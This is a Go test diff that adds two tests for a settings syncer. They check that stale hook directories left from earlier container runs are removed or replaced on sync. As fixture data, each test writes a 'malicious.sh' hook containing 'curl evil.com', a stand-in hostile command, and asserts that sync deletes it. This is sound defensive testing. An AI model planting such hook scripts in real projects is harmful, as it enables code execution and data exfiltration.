@@ -387,3 +387,65 @@ func TestPatchSettingsForContainer(t *testing.T) {
 		})
 	}
 }
+
+func TestSyncSettings_RemovesStaleDirsWhenHostDirMissing(t *testing.T) {
+	hostDir := t.TempDir()
+	stageDir := t.TempDir()
+
+	// Simulate stale hooks dir left by a previous container run
+	staleHooksDir := filepath.Join(stageDir, "hooks")
+	if err := os.MkdirAll(staleHooksDir, 0755); err != nil {
+		t.Fatal(err)
+	}
+	if err := os.WriteFile(filepath.Join(staleHooksDir, "malicious.sh"), []byte("#!/bin/sh\ncurl evil.com"), 0755); err != nil {
+		t.Fatal(err)
+	}
+
+	// Host has no hooks dir — sync should remove the stale one
+	syncer := NewSyncer()
+	if err := syncer.SyncToolSettings(hostDir, stageDir, ClaudeSyncSpec); err != nil {
+		t.Fatalf("SyncToolSettings() error: %v", err)
+	}
+
+	if _, err := os.Stat(staleHooksDir); !os.IsNotExist(err) {
+		t.Error("stale hooks directory should have been removed when host dir does not exist")
+	}
+}
+
+func TestSyncSettings_OverwritesStaleDirsWhenHostDirExists(t *testing.T) {
+	hostDir := t.TempDir()
+	stageDir := t.TempDir()
+
+	// Create host hooks dir with a legitimate hook
+	hostHooksDir := filepath.Join(hostDir, "hooks")
+	if err := os.MkdirAll(hostHooksDir, 0755); err != nil {
+		t.Fatal(err)
+	}
+	if err := os.WriteFile(filepath.Join(hostHooksDir, "good.sh"), []byte("#!/bin/sh\necho ok"), 0755); err != nil {
+		t.Fatal(err)
+	}
+
+	// Simulate stale hooks in staging with an extra malicious file
+	stageHooksDir := filepath.Join(stageDir, "hooks")
+	if err := os.MkdirAll(stageHooksDir, 0755); err != nil {
+		t.Fatal(err)
+	}
+	if err := os.WriteFile(filepath.Join(stageHooksDir, "malicious.sh"), []byte("#!/bin/sh\ncurl evil.com"), 0755); err != nil {
+		t.Fatal(err)
+	}
+
+	syncer := NewSyncer()
+	if err := syncer.SyncToolSettings(hostDir, stageDir, ClaudeSyncSpec); err != nil {
+		t.Fatalf("SyncToolSettings() error: %v", err)
+	}
+
+	// Legitimate hook should exist
+	if _, err := os.Stat(filepath.Join(stageHooksDir, "good.sh")); err != nil {
+		t.Error("legitimate hook should exist after sync")
+	}
+
+	// Malicious hook should be gone (dir was replaced)
+	if _, err := os.Stat(filepath.Join(stageHooksDir, "malicious.sh")); !os.IsNotExist(err) {
+		t.Error("malicious hook should have been removed after sync")
+	}
+}
